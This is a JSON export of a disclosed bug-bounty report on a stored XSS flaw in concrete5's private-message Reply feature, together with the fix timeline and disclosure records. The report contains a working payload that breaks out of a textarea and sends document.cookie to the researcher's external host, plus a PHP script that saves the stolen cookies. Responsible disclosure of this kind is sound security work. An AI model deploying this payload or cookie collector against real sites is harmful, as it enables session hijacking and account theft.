@@ -1,0 +1,286 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": "2017-07-18T22:12:43.190Z", 
+    "voters": [
+        "skansing", 
+        "eveeez", 
+        "axolotl", 
+        "ons", 
+        "atruba", 
+        "aroly", 
+        "khaledibnalwalid", 
+        "infosecone"
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": false, 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 247517, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": null, 
+    "vulnerability_information": "## Intro\n\n\"Back to the Crayons\"\n\n__Type of issue__: Core CMS issue\n__Level of severity__: External Attack Vector\n__Concrete5 version__: 8.2.0 RC2 rev. 32c9daf352645d4fafedb7b956e7f2de4e153ab3 (July 8th)\n\n## Summary\n\nThere is __Stored XSS__ vulnerability in Private Messages 'Reply' feature, when original message is quoted in reply content (this is by default). This issue can be used against any user, who accepted receiving private messages and replies to the message contains malicious payload.\n\nTo exploit this vulnerability an attacker has to trick other user to reply to his message.\n\n## Steps to reproduce\n\n- log in to concrete5 instance as any user\n- go to ```index.php/account/messages```. Change url to ```index.php/account/messages/write/1``` which is equivalent to sending PM to __admin__ (changing user id in url to any other value allows to send message to selected user)\n- set message title, then as a content of message put (at the end): closing ```</textarea>``` tag followed by any valid JavaScript code inside ```<script>``` tag. \n\n{F201511}\n\nI used following payload in my attack:\n\n```html\n</textarea>\n<script>\n    var i = document.createElement('img')\n    i.src = 'https://bl4de.000webhostapp.com/?c=' + document.cookie;\n    document.body.append(i);\n</script>\n```\n\nIt creates and appends ```img``` element with url which points to my server on 000web hosting and allows to send cookie(s) to my PHP script:\n\n```php\nHello :)\n<?php\nif (isset($_GET['c'])) {\n\tfile_put_contents(\"cookies.txt\", $_GET['c']);\n}\n```\n\n\n- send message\n\n\n\nTo verify that vulnerability exists, log in as __admin__ (or any user you've sent message to) and go to Private Messages Inbox:\n\n{F201512}\n\n- open message\n\nThe content is properly sanitized (no JavaScript executed):\n\n\n{F201514}\n\n\n\nNow the fun part begins.\n\nSelect __Reply__ from the dropdown with message menu. As you can see, content of the original message is embeded below ```------- Original Message -------``` separator, however - is __not sanitized__, causes JavaScript script is executed __in context of logged admin__ (my sample attack scenario tries to steal cookie to hijack admin session and failed due to ```Http Only``` flag set, but it does not change the fact that Stored XSS attack works):\n\n{F201513}\n\nWhen we inspect HTML source, we can verify that closing ```</textarea>``` tag from payload allows to \"escape\" from message textarea and append and run JavaScript:\n\n```html\n<div class=\"form-group\">\n\t\t\t\t<label for=\"body\" class=\"control-label\">Message</label>\t\t\t\t<textarea id=\"msgBody\" name=\"msgBody\" rows=\"8\" class=\"span5 form-control\">\n\n\n-------------------- Original Message --------------------\nFrom: kotek\nDate Sent: Jul 9, 2017, 9:55 PM\nSubject: Problem with page!!!\n\nHi, could you please take a look at this and reply? Thanks!\n\n</textarea>\n<script>\n        var i = document.createElement('img')\n        i.src = 'https://bl4de.000webhostapp.com/?c=' + document.cookie;\n        document.body.append(i);\n    </script></textarea>\t\t\t</div>\n\n\t\t\t<div class=\"ccm-dashboard-form-actions-wrapper\">\n\t\t\t    <div class=\"ccm-dashboard-form-actions\">\n```\n\n\nIn presented PoC, one cookie was sent and saved on my 000web application:\n\n{F201515}\n\n\n## Impact\n\nAny user is able to send PM to other user(s) with malicious payload trying to trick them to reply to his message. This scenario is described as __External Attack Vector__ in Concrete5 program policy.\n\n\n## Testing environment\n\nSystem:\n\n- Concrete5 version 8.2.0 RC2, commit 32c9daf352645d4fafedb7b956e7f2de4e153ab3 from July  8th, installed localy\n- PHP ver. 5.6.30\n- Apache HTTP Server 2.4.25 for macOS\n- MySQL ver. 5.7.13 for macOS\n\nThis vulnerability was tested on macOS Sierra 10.12.5 with following browsers:\n\n- Chrome 59.0.3071.115\n- Chromium build 61.0.3131.0\n- Opera 46.0.2597.32\n\n\n## Wrap up\n\nI hope my report will help keep Concrete5 safe in the future.\n\nBest Regards,\n\nRafal 'bl4de' Janicki", 
+    "activity_page_count": 1, 
+    "severity": {
+        "rating": "high", 
+        "author_type": "User"
+    }, 
+    "title": "Stored XSS in Private Messages 'Reply' allows to execute malicious JavaScript against any user while replying to the message which contains payload", 
+    "is_member_of_team?": null, 
+    "vote_count": 8, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_create?": false, 
+            "can_view?": true
+        }, 
+        {
+            "category": "researcher", 
+            "can_create?": false, 
+            "can_view?": true
+        }
+    ], 
+    "structured_scope": null, 
+    "allow_singular_disclosure_at": "2017-08-17T22:12:43.229Z", 
+    "state": "Closed", 
+    "cve_ids": [], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "attachments": [
+        {
+            "file_name": "pm_stroedxss_1.png", 
+            "type": "image/png", 
+            "id": 201511, 
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/201/511/e4a5eed18fe444b9b202ae6b132a28e0e467b0be/pm_stroedxss_1.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ74T23ZH2%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T223412Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDKP8gtonlolbwRCFkSK3A8zRiM4XrfrPxhuRQyPzGewY%2F8%2BrZubJgueFivdcxl7%2F3iKHqTcriXEfjKl%2BSTmdTrFI3DombVHMKOYwlG1hM21jXAfSh72gDN%2BHds5TF5Hko27v6DRiCzuemhdgF47giYHnyCL3NCtcZ280H43hMDk8jiMZIUa5jSGS%2FYM0UQD2eITjNKscKu9Fg3jnQOs%2FtI0LbTq4ZOYkHzJsx3Gx5wmY15OB78PVb%2FoanvGsdZ1G6JLoOvoTJtP%2BBGbZSfLbuJ1WmFVnDe95bwaZBXmmNFIwMDxV%2BIfpWj4A6egpifpz3xxmRRWcE1dqWPIhLKaatOintqSYA20U00rLoCNdGd9IKmu0qa6%2B8Nt35qrWRxLjUKFoVkfzI8plSmUmq%2B7hZ71fbl9wB5sUhWpjZP521spZTb6QY8FJEa8S3BRJSDNUSr0ecK5GZt3wvmq5ONCWAeZbidiSFNHoYpY72e9tiuClRIfQzkSOa7JE0OSN9ATAt8rjzLAGibK5D8CP7%2F23wI%2Fce9%2BQ7jYxhSDeUleT1ird2slt6z2voHzFGPzgGkupeiNthV4QvkyXxyIQFGYYyeRDJ%2FnjD%2Boo666m4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7f598cb0540a39261228ee909e2927bb58bbed4fc680d159ba7f5bd39b0b0b72"
+        }, 
+        {
+            "file_name": "pm_stroedxss_2.png", 
+            "type": "image/png", 
+            "id": 201512, 
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/201/512/0fe841c0e39b607f6f779c59948d36a51ec0f868/pm_stroedxss_2.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ74T23ZH2%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T223412Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDKP8gtonlolbwRCFkSK3A8zRiM4XrfrPxhuRQyPzGewY%2F8%2BrZubJgueFivdcxl7%2F3iKHqTcriXEfjKl%2BSTmdTrFI3DombVHMKOYwlG1hM21jXAfSh72gDN%2BHds5TF5Hko27v6DRiCzuemhdgF47giYHnyCL3NCtcZ280H43hMDk8jiMZIUa5jSGS%2FYM0UQD2eITjNKscKu9Fg3jnQOs%2FtI0LbTq4ZOYkHzJsx3Gx5wmY15OB78PVb%2FoanvGsdZ1G6JLoOvoTJtP%2BBGbZSfLbuJ1WmFVnDe95bwaZBXmmNFIwMDxV%2BIfpWj4A6egpifpz3xxmRRWcE1dqWPIhLKaatOintqSYA20U00rLoCNdGd9IKmu0qa6%2B8Nt35qrWRxLjUKFoVkfzI8plSmUmq%2B7hZ71fbl9wB5sUhWpjZP521spZTb6QY8FJEa8S3BRJSDNUSr0ecK5GZt3wvmq5ONCWAeZbidiSFNHoYpY72e9tiuClRIfQzkSOa7JE0OSN9ATAt8rjzLAGibK5D8CP7%2F23wI%2Fce9%2BQ7jYxhSDeUleT1ird2slt6z2voHzFGPzgGkupeiNthV4QvkyXxyIQFGYYyeRDJ%2FnjD%2Boo666m4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=76480e204cd5a4ae865f6d07bdde76cb0056f55959c8ecaf5510ff8ba4fe6e94"
+        }, 
+        {
+            "file_name": "pm_stroedxss_4.png", 
+            "type": "image/png", 
+            "id": 201513, 
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/201/513/fb2d95eeb30b341d92a8a8d9749c966dae068fd2/pm_stroedxss_4.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ74T23ZH2%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T223412Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDKP8gtonlolbwRCFkSK3A8zRiM4XrfrPxhuRQyPzGewY%2F8%2BrZubJgueFivdcxl7%2F3iKHqTcriXEfjKl%2BSTmdTrFI3DombVHMKOYwlG1hM21jXAfSh72gDN%2BHds5TF5Hko27v6DRiCzuemhdgF47giYHnyCL3NCtcZ280H43hMDk8jiMZIUa5jSGS%2FYM0UQD2eITjNKscKu9Fg3jnQOs%2FtI0LbTq4ZOYkHzJsx3Gx5wmY15OB78PVb%2FoanvGsdZ1G6JLoOvoTJtP%2BBGbZSfLbuJ1WmFVnDe95bwaZBXmmNFIwMDxV%2BIfpWj4A6egpifpz3xxmRRWcE1dqWPIhLKaatOintqSYA20U00rLoCNdGd9IKmu0qa6%2B8Nt35qrWRxLjUKFoVkfzI8plSmUmq%2B7hZ71fbl9wB5sUhWpjZP521spZTb6QY8FJEa8S3BRJSDNUSr0ecK5GZt3wvmq5ONCWAeZbidiSFNHoYpY72e9tiuClRIfQzkSOa7JE0OSN9ATAt8rjzLAGibK5D8CP7%2F23wI%2Fce9%2BQ7jYxhSDeUleT1ird2slt6z2voHzFGPzgGkupeiNthV4QvkyXxyIQFGYYyeRDJ%2FnjD%2Boo666m4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=5031ef06809a8220b41028eddfb0854a1dc19d32529072f11267813e743825fc"
+        }, 
+        {
+            "file_name": "pm_stroedxss_3.png", 
+            "type": "image/png", 
+            "id": 201514, 
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/201/514/6c7fb53cc99bacadc05353dd8f831c63095a80f0/pm_stroedxss_3.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ74T23ZH2%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T223412Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDKP8gtonlolbwRCFkSK3A8zRiM4XrfrPxhuRQyPzGewY%2F8%2BrZubJgueFivdcxl7%2F3iKHqTcriXEfjKl%2BSTmdTrFI3DombVHMKOYwlG1hM21jXAfSh72gDN%2BHds5TF5Hko27v6DRiCzuemhdgF47giYHnyCL3NCtcZ280H43hMDk8jiMZIUa5jSGS%2FYM0UQD2eITjNKscKu9Fg3jnQOs%2FtI0LbTq4ZOYkHzJsx3Gx5wmY15OB78PVb%2FoanvGsdZ1G6JLoOvoTJtP%2BBGbZSfLbuJ1WmFVnDe95bwaZBXmmNFIwMDxV%2BIfpWj4A6egpifpz3xxmRRWcE1dqWPIhLKaatOintqSYA20U00rLoCNdGd9IKmu0qa6%2B8Nt35qrWRxLjUKFoVkfzI8plSmUmq%2B7hZ71fbl9wB5sUhWpjZP521spZTb6QY8FJEa8S3BRJSDNUSr0ecK5GZt3wvmq5ONCWAeZbidiSFNHoYpY72e9tiuClRIfQzkSOa7JE0OSN9ATAt8rjzLAGibK5D8CP7%2F23wI%2Fce9%2BQ7jYxhSDeUleT1ird2slt6z2voHzFGPzgGkupeiNthV4QvkyXxyIQFGYYyeRDJ%2FnjD%2Boo666m4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=68df37005ee272ce630b9a9308ad93c898f6a6bef3c500ddb50c7b21542f00e4"
+        }, 
+        {
+            "file_name": "pm_stroedxss_5.png", 
+            "type": "image/png", 
+            "id": 201515, 
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/201/515/d503c42b3378cef8248b95266d07321625383eb5/pm_stroedxss_5.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ74T23ZH2%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T223412Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA8aDKP8gtonlolbwRCFkSK3A8zRiM4XrfrPxhuRQyPzGewY%2F8%2BrZubJgueFivdcxl7%2F3iKHqTcriXEfjKl%2BSTmdTrFI3DombVHMKOYwlG1hM21jXAfSh72gDN%2BHds5TF5Hko27v6DRiCzuemhdgF47giYHnyCL3NCtcZ280H43hMDk8jiMZIUa5jSGS%2FYM0UQD2eITjNKscKu9Fg3jnQOs%2FtI0LbTq4ZOYkHzJsx3Gx5wmY15OB78PVb%2FoanvGsdZ1G6JLoOvoTJtP%2BBGbZSfLbuJ1WmFVnDe95bwaZBXmmNFIwMDxV%2BIfpWj4A6egpifpz3xxmRRWcE1dqWPIhLKaatOintqSYA20U00rLoCNdGd9IKmu0qa6%2B8Nt35qrWRxLjUKFoVkfzI8plSmUmq%2B7hZ71fbl9wB5sUhWpjZP521spZTb6QY8FJEa8S3BRJSDNUSr0ecK5GZt3wvmq5ONCWAeZbidiSFNHoYpY72e9tiuClRIfQzkSOa7JE0OSN9ATAt8rjzLAGibK5D8CP7%2F23wI%2Fce9%2BQ7jYxhSDeUleT1ird2slt6z2voHzFGPzgGkupeiNthV4QvkyXxyIQFGYYyeRDJ%2FnjD%2Boo666m4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=743f654aafc656446f8a3c5d22ecb7ffae1cbb5909d9cc1393fcc30d1a7774a8"
+        }
+    ], 
+    "singular_disclosure_disabled": false, 
+    "activities": [
+        {
+            "automated_response": false, 
+            "created_at": "2017-07-09T21:57:26.936Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-07-09T21:57:26.936Z", 
+            "actor": {
+                "username": "bl4de", 
+                "url": "/bl4de", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/017/622/32292cbe1a952c345aef237a5dde32d13a7489cf_medium.jpg?1424108731"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "additional_data": {
+                "new_title": "Stored XSS in Private Messages 'Reply' allows to execute malicious JavaScript against any user while replying to the message which contains payload", 
+                "old_title": "Stored XSS in Private Messages 'Reply' allows to execute malicious JavaScript against any user while replying to the message contains payload"
+            }, 
+            "team_handle": "concrete5", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportTitleUpdated", 
+            "id": 1818429, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-07-18T19:08:01.091Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-07-18T19:08:01.091Z", 
+            "actor": {
+                "username": "bl4de", 
+                "url": "/bl4de", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/017/622/32292cbe1a952c345aef237a5dde32d13a7489cf_medium.jpg?1424108731"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "concrete5", 
+            "message": "Hi Guys,\n\nI've opened PR for this issue on GitHub:\nhttps://github.com/concrete5/concrete5/pull/5725\n\nRegards,\n\nbl4de\n", 
+            "markdown_message": "<p>Hi Guys,</p>\n\n<p>I&#39;ve opened PR for this issue on GitHub:<br>\n<a title=\"https://github.com/concrete5/concrete5/pull/5725\" href=\"/redirect?signature=46fc16550f61eef65d5e2fa5805ea9c1e2f59576&amp;url=https%3A%2F%2Fgithub.com%2Fconcrete5%2Fconcrete5%2Fpull%2F5725\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://github.com/concrete5/concrete5/pull/5725</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>Regards,</p>\n\n<p>bl4de</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1847764, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "bl4de", 
+                "url": "/bl4de"
+            }, 
+            "created_at": "2017-07-18T20:32:44.798Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-07-18T20:32:44.798Z", 
+            "actor": {
+                "username": "aembler", 
+                "url": "/aembler", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "concrete5", 
+            "message": "Thanks! This has been merged in and will be available in 8.2.", 
+            "markdown_message": "<p>Thanks! This has been merged in and will be available in 8.2.</p>\n", 
+            "type": "Activities::BugResolved", 
+            "id": 1847955, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-07-18T22:12:43.208Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-07-18T22:12:43.208Z", 
+            "actor": {
+                "username": "bl4de", 
+                "url": "/bl4de", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/017/622/32292cbe1a952c345aef237a5dde32d13a7489cf_medium.jpg?1424108731"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "concrete5", 
+            "first_to_agree": true, 
+            "message": "Great!\n\nIf you don't mind, can we disclose this report after 8.2 Release?\n\nRegards,\n\nbl4de", 
+            "markdown_message": "<p>Great!</p>\n\n<p>If you don&#39;t mind, can we disclose this report after 8.2 Release?</p>\n\n<p>Regards,</p>\n\n<p>bl4de</p>\n", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 1848224, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-08-17T22:12:55.514Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-08-17T22:12:55.514Z", 
+            "actor": {
+                "url": "/concrete5", 
+                "profile": {
+                    "name": "concrete5"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/060/80201c838134b35b9b1acd99ad8a7a7c214aa374_medium.jpg?1393279055"
+                }
+            }, 
+            "team_handle": "concrete5", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 1937688, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "singular_disclosure_allowed": true, 
+    "reporter": {
+        "username": "bl4de", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/bl4de", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/017/622/36f4fb2f20566c21ddbacf07cd490330ca853c91_small.jpg?1424108731"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 62, 
+        "name": "Cross-site Scripting (XSS) - Stored"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "allow_singular_disclosure_after": -41127689.36507123, 
+    "disclosed_at": "2017-08-17T22:12:55.495Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/247517", 
+    "created_at": "2017-07-09T21:57:07.812Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<h2 id=\"intro\">Intro</h2>\n\n<p>&quot;Back to the Crayons&quot;</p>\n\n<p><strong>Type of issue</strong>: Core CMS issue<br>\n<strong>Level of severity</strong>: External Attack Vector<br>\n<strong>Concrete5 version</strong>: 8.2.0 RC2 rev. 32c9daf352645d4fafedb7b956e7f2de4e153ab3 (July 8th)</p>\n\n<h2 id=\"summary\">Summary</h2>\n\n<p>There is <strong>Stored XSS</strong> vulnerability in Private Messages &#39;Reply&#39; feature, when original message is quoted in reply content (this is by default). This issue can be used against any user, who accepted receiving private messages and replies to the message contains malicious payload.</p>\n\n<p>To exploit this vulnerability an attacker has to trick other user to reply to his message.</p>\n\n<h2 id=\"steps-to-reproduce\">Steps to reproduce</h2>\n\n<ul>\n<li>log in to concrete5 instance as any user</li>\n<li>go to <code>index.php/account/messages</code>. Change url to <code>index.php/account/messages/write/1</code> which is equivalent to sending PM to <strong>admin</strong> (changing user id in url to any other value allows to send message to selected user)</li>\n<li>set message title, then as a content of message put (at the end): closing <code>&lt;/textarea&gt;</code> tag followed by any valid JavaScript code inside <code>&lt;script&gt;</code> tag. </li>\n</ul>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"pm_stroedxss_1.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/201/511/e4a5eed18fe444b9b202ae6b132a28e0e467b0be/pm_stroedxss_1.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ74T23ZH2%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T223412Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDKP8gtonlolbwRCFkSK3A8zRiM4XrfrPxhuRQyPzGewY%2F8%2BrZubJgueFivdcxl7%2F3iKHqTcriXEfjKl%2BSTmdTrFI3DombVHMKOYwlG1hM21jXAfSh72gDN%2BHds5TF5Hko27v6DRiCzuemhdgF47giYHnyCL3NCtcZ280H43hMDk8jiMZIUa5jSGS%2FYM0UQD2eITjNKscKu9Fg3jnQOs%2FtI0LbTq4ZOYkHzJsx3Gx5wmY15OB78PVb%2FoanvGsdZ1G6JLoOvoTJtP%2BBGbZSfLbuJ1WmFVnDe95bwaZBXmmNFIwMDxV%2BIfpWj4A6egpifpz3xxmRRWcE1dqWPIhLKaatOintqSYA20U00rLoCNdGd9IKmu0qa6%2B8Nt35qrWRxLjUKFoVkfzI8plSmUmq%2B7hZ71fbl9wB5sUhWpjZP521spZTb6QY8FJEa8S3BRJSDNUSr0ecK5GZt3wvmq5ONCWAeZbidiSFNHoYpY72e9tiuClRIfQzkSOa7JE0OSN9ATAt8rjzLAGibK5D8CP7%2F23wI%2Fce9%2BQ7jYxhSDeUleT1ird2slt6z2voHzFGPzgGkupeiNthV4QvkyXxyIQFGYYyeRDJ%2FnjD%2Boo666m4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=7f598cb0540a39261228ee909e2927bb58bbed4fc680d159ba7f5bd39b0b0b72\" data-attachment-type=\"image/png\"><img src=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/201/511/e4a5eed18fe444b9b202ae6b132a28e0e467b0be/pm_stroedxss_1.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ74T23ZH2%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T223412Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDKP8gtonlolbwRCFkSK3A8zRiM4XrfrPxhuRQyPzGewY%2F8%2BrZubJgueFivdcxl7%2F3iKHqTcriXEfjKl%2BSTmdTrFI3DombVHMKOYwlG1hM21jXAfSh72gDN%2BHds5TF5Hko27v6DRiCzuemhdgF47giYHnyCL3NCtcZ280H43hMDk8jiMZIUa5jSGS%2FYM0UQD2eITjNKscKu9Fg3jnQOs%2FtI0LbTq4ZOYkHzJsx3Gx5wmY15OB78PVb%2FoanvGsdZ1G6JLoOvoTJtP%2BBGbZSfLbuJ1WmFVnDe95bwaZBXmmNFIwMDxV%2BIfpWj4A6egpifpz3xxmRRWcE1dqWPIhLKaatOintqSYA20U00rLoCNdGd9IKmu0qa6%2B8Nt35qrWRxLjUKFoVkfzI8plSmUmq%2B7hZ71fbl9wB5sUhWpjZP521spZTb6QY8FJEa8S3BRJSDNUSr0ecK5GZt3wvmq5ONCWAeZbidiSFNHoYpY72e9tiuClRIfQzkSOa7JE0OSN9ATAt8rjzLAGibK5D8CP7%2F23wI%2Fce9%2BQ7jYxhSDeUleT1ird2slt6z2voHzFGPzgGkupeiNthV4QvkyXxyIQFGYYyeRDJ%2FnjD%2Boo666m4AU%3D&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Signature=7f598cb0540a39261228ee909e2927bb58bbed4fc680d159ba7f5bd39b0b0b72\" class=\"markdown-inline-image\"></a></p>\n\n<p>I used following payload in my attack:</p>\n<pre class=\"highlight html\"><code><span class=\"nt\">&lt;/textarea&gt;</span>\n<span class=\"nt\">&lt;script&gt;</span>\n    <span class=\"kd\">var</span> <span class=\"nx\">i</span> <span class=\"o\">=</span> <span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">createElement</span><span class=\"p\">(</span><span class=\"s1\">&#39;img&#39;</span><span class=\"p\">)</span>\n    <span class=\"nx\">i</span><span class=\"p\">.</span><span class=\"nx\">src</span> <span class=\"o\">=</span> <span class=\"s1\">&#39;https://bl4de.000webhostapp.com/?c=&#39;</span> <span class=\"o\">+</span> <span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">cookie</span><span class=\"p\">;</span>\n    <span class=\"nb\">document</span><span class=\"p\">.</span><span class=\"nx\">body</span><span class=\"p\">.</span><span class=\"nx\">append</span><span class=\"p\">(</span><span class=\"nx\">i</span><span class=\"p\">);</span>\n<span class=\"nt\">&lt;/script&gt;</span>\n</code></pre>\n<p>It creates and appends <code>img</code> element with url which points to my server on 000web hosting and allows to send cookie(s) to my PHP script:</p>\n<pre class=\"highlight php\"><code>Hello :)\n<span class=\"cp\">&lt;?php</span>\n<span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nb\">isset</span><span class=\"p\">(</span><span class=\"nv\">$_GET</span><span class=\"p\">[</span><span class=\"s1\">&#39;c&#39;</span><span class=\"p\">]))</span> <span class=\"p\">{</span>\n    <span class=\"nb\">file_put_contents</span><span class=\"p\">(</span><span class=\"s2\">&quot;cookies.txt&quot;</span><span class=\"p\">,</span> <span class=\"nv\">$_GET</span><span class=\"p\">[</span><span class=\"s1\">&#39;c&#39;</span><span class=\"p\">]);</span>\n<span class=\"p\">}</span>\n</code></pre>\n<ul>\n<li>send message</li>\n</ul>\n\n<p>To verify that vulnerability exists, log in as <strong>admin</strong> (or any user you&#39;ve sent message to) and go to Private Messages Inbox:</p>\n\n<p><a href=\"#\" class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"pm_stroedxss_2.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/201/512/0fe841c0e39b607f6f779c59948d36a51ec0f868/pm_stroedxss_2.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQGK6FURQ74T23ZH2%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&amp;X-Amz-Date=20181206T223412Z&amp;X-Amz-Expires=3600&amp;X-Amz-Security-Token=FQoGZXIvYXdzEA8aDKP8gtonlolbwRCFkSK3A8zRiM4XrfrPxhuRQyPzGewY%2F8%2BrZubJgueFivdcxl7%2F3iKHqTcriXEfjKl%2BSTmdTrFI3DombVHMKOYwlG1hM21jXAfSh72gDN%2BHds5TF5Hko27v6DRiCzuemhdgF47giYHnyCL3NCtcZ280H43hMDk8jiMZIUa5jSGS%2FYM0UQD2eITjNKscKu9Fg3jnQOs%2FtI0LbTq4ZOYkHzJsx3Gx5wmY15OB78PVb%2FoanvGsdZ1G6JLoOvoTJtP%2BBGbZSfLbuJ1WmFVnDe95bwaZBXmmNFIwMDxV%2BIfpWj4A6egpifpz3xxmRRWcE1dqWPIhLKaatOintqSYA20U00rLoCNdGd9IKmu0qa6%2B8Nt35qrWRxLjUKFoVkfzI8plSmUmq%2B7hZ71fbl9wB5sUhWpjZP521spZTb6QY8FJEa8S3BRJS